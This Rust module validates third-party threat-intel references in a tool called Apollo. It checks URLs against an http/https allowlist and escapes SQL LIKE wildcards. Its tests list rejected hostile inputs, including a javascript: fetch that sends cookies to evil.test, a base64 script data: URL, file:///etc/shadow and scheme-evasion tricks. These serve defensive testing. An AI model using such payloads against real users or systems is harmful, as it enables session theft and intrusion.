//! Validation for values crossing the third-party-intel trust boundary
//! (`docs/threat-model.md`, TB-2).
//!
//! MalwareBazaar and ThreatFox content is partly community-submitted --
//! ThreatFox's per-IOC `reference` field is supplied by whoever submitted
//! the IOC. Values from there are stored in Apollo's own graph and later
//! rendered to the analyst, so they get validated here, at the crossing,
//! rather than at whichever consumer happens to touch them later.

/// URL schemes Apollo will store and show as a clickable provenance link.
/// Deliberately an allowlist: the set of dangerous schemes is open-ended
/// (`javascript:`, `data:`, `vbscript:`, `file:`, plus whatever a given
/// webview registers), while the set Apollo actually needs is exactly
/// these two.
const ALLOWED_URL_SCHEMES: [&str; 2] = ["http", "https"];

/// Returns `Some(url)` when `candidate` is a plausible, safe-to-render
/// external reference, `None` otherwise. Callers substitute their own
/// trusted fallback (e.g. a canonical link built from the feed's own ID)
/// rather than storing the rejected value.
///
/// Scheme-checked against an allowlist, case-insensitively, after
/// trimming: `JavaScript:`, leading whitespace, and control characters are
/// all common filter-evasion tricks, and a webview's URL parser is far
/// more forgiving than a naive `starts_with("http")` check.
///
/// This does not attempt to judge whether the *host* is trustworthy -- a
/// feed can legitimately reference any `https://` site, and Apollo shows
/// the link as provenance without fetching it. See the threat model's
/// "known accepted risks".
///
/// Deliberately does not rely on the frontend to neutralize a bad value.
/// React does happen to replace `javascript:` hrefs, but that covers one
/// scheme, is a framework implementation detail rather than a control this
/// project owns, and does nothing for the other consumers of the same
/// stored column (the Phase 1 console renders with maud, and PR #20's hunt
/// engine will consume these programmatically).
pub fn safe_external_url(candidate: &str) -> Option<&str> {
    let trimmed = candidate.trim();
    if trimmed.is_empty() {
        return None;
    }
    // Control characters (including embedded NUL, newline, and tab) can
    // split or hide a scheme from a naive check while a URL parser still
    // honors them.
    if trimmed.chars().any(|c| c.is_control()) {
        return None;
    }
    let (scheme, rest) = trimmed.split_once("://")?;
    if rest.is_empty() {
        return None;
    }
    ALLOWED_URL_SCHEMES
        .iter()
        .any(|allowed| scheme.eq_ignore_ascii_case(allowed))
        .then_some(trimmed)
}

/// Escapes a value for safe use inside a SQL `LIKE`/`ILIKE` pattern that
/// the caller wraps in `%`.
///
/// Postgres treats `%` and `_` as wildcards inside a LIKE pattern, so an
/// indicator value containing either silently changes what the pattern
/// matches -- a stored path indicator of just `%` matches *every* scanned
/// file, turning one poisoned or malformed feed row into a universal false
/// positive. Verified against Postgres directly:
/// `'/any/path' ILIKE '%' || '%' || '%'` is `true`.
///
/// Uses backslash as the escape character, which is Postgres's default for
/// LIKE; callers must not also set an explicit `ESCAPE` clause that
/// disagrees. Escaping the backslash itself first is required so an
/// indicator ending in `\` can't escape the closing `%` the caller adds.
pub fn escape_like_pattern(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for c in value.chars() {
        if matches!(c, '\\' | '%' | '_') {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_ordinary_feed_reference_urls() {
        assert_eq!(
            safe_external_url("https://bazaar.abuse.ch/sample/abc/"),
            Some("https://bazaar.abuse.ch/sample/abc/")
        );
        assert_eq!(
            safe_external_url("http://example.test/report?id=1"),
            Some("http://example.test/report?id=1")
        );
    }

    #[test]
    fn trims_surrounding_whitespace_rather_than_rejecting() {
        assert_eq!(
            safe_external_url("  https://example.test/x  "),
            Some("https://example.test/x")
        );
    }

    /// The core of TB-2: a community-submitted `reference` is attacker
    /// text. Every one of these is a real filter-evasion shape, not a
    /// hypothetical.
    #[test]
    fn rejects_dangerous_and_evasive_schemes() {
        for bad in [
            "javascript:fetch('http://evil.test/'+document.cookie)",
            "JavaScript:alert(1)",
            "  javascript:alert(1)",
            "jAvAsCrIpT://example.test/%0aalert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)",
            "file:///etc/shadow",
            "tauri://localhost/",
            "",
            "   ",
            "not-a-url",
            "https://",
        ] {
            assert_eq!(
                safe_external_url(bad),
                None,
                "expected {bad:?} to be rejected at the trust boundary"
            );
        }
    }

    #[test]
    fn rejects_control_characters_used_to_hide_a_scheme() {
        assert_eq!(safe_external_url("java\nscript:alert(1)"), None);
        assert_eq!(safe_external_url("https://ok.test/\u{0}evil"), None);
        assert_eq!(safe_external_url("\tjavascript:alert(1)"), None);
    }

    #[test]
    fn escapes_like_wildcards_so_one_indicator_cannot_match_everything() {
        // The exact shape confirmed against Postgres: an unescaped `%`
        // indicator matches every path.
        assert_eq!(escape_like_pattern("%"), "\\%");
        assert_eq!(escape_like_pattern("_"), "\\_");
        assert_eq!(escape_like_pattern("a%b_c"), "a\\%b\\_c");
    }

    #[test]
    fn escapes_the_escape_character_itself() {
        // Without this, a value ending in a backslash would escape the
        // closing `%` the caller appends and change the pattern's shape.
        assert_eq!(escape_like_pattern("ends-with\\"), "ends-with\\\\");
    }

    #[test]
    fn leaves_ordinary_path_indicators_unchanged() {
        assert_eq!(escape_like_pattern("/usr/lib/evil.so"), "/usr/lib/evil.so");
    }
}
